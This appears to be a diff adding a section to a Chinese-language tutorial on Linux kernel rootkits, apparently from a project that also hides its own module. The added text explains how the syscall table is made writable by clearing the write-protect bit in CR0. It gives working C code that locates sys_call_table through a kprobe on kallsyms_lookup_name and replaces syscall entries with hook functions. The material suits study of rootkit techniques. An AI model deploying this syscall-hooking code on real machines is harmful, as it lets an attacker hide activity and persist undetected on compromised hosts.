@@ -300,7 +300,76 @@ void module_hide(void)
 在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。
  
- 
+系统调用表是只读的，在内核中，CR0是一个控制寄存器，可以修改处理器的操作方式。其中的第16位是写保护标志所在的位置，如果该标志为0，CPU就可以让内核写入只读区域。Linux为我们提供了两个很有帮助的函数，可以用于修改CR0寄存器，分别是write_cr0和read_cr0。
+
+
+这段代码的功能主要是找到sys_call_table的地址，由于内核版本不用，新版本内核用到了kprobe：
+- 获取kallsyms_lookup_name函数的地址，用于后续查找内核符号。
+- 查找并获取sys_call_table的地址，用于系统调用表的修改。
+
+
+```bash
+
+int sys_call_table_init(void) {
+    /* lookup address of kallsyms_lookup_name() */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
+    if (register_kprobe(&kp) < 0)
+        return -EFAULT;
+    kallsyms_lookup_name_ref = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+    if (!kallsyms_lookup_name_ref) {
+        pr_err(LOG_PREFIX "failed to lookup function kallsyms_lookup_name()\n");
+        return -EFAULT;
+    }
+#else
+    kallsyms_lookup_name_ref = kallsyms_lookup_name;
+#endif
+
+    /* lookup address of sys_call_table */
+    sys_call_table_ref =
+        (t_syscall *)kallsyms_lookup_name_ref("sys_call_table");
+    if (!sys_call_table_ref) {
+        pr_err(LOG_PREFIX "failed to lookup symbol: sys_call_table\n");
+        return -EFAULT;
+    }
+    return 0;
+}
+
+```
+
+这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:
+
+- 读取并保存当前CR0寄存器值。
+- 将原系统调用保存到orig_fn。
+- 修改CR0寄存器以允许写入系统调用表。
+- 替换系统调用表中的指定系统调用为新函数。
+- 恢复CR0寄存器值。
+
+
+```bash
+static inline void write_cr0_forced(unsigned long val) {
+    unsigned long __force_order;
+    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
+
+void hook_sys_call_table(long int sysno, t_syscall hook_fn,
+                         t_syscall *orig_fn) {
+    unsigned long cr0;
+    pr_info(LOG_PREFIX "hook syscall number %ld", sysno);
+    if (!sys_call_table_ref) {
+        pr_warn(LOG_PREFIX
+                "address of sys_call_table was not found, skip hook\n");
+        return;
+    }
+    cr0 = read_cr0();
+    *orig_fn = sys_call_table_ref[sysno];
+    write_cr0_forced(cr0 & ~0x00010000);
+    sys_call_table_ref[sysno] = hook_fn;
+    write_cr0_forced(cr0);
+}
+
+```
  
  
  
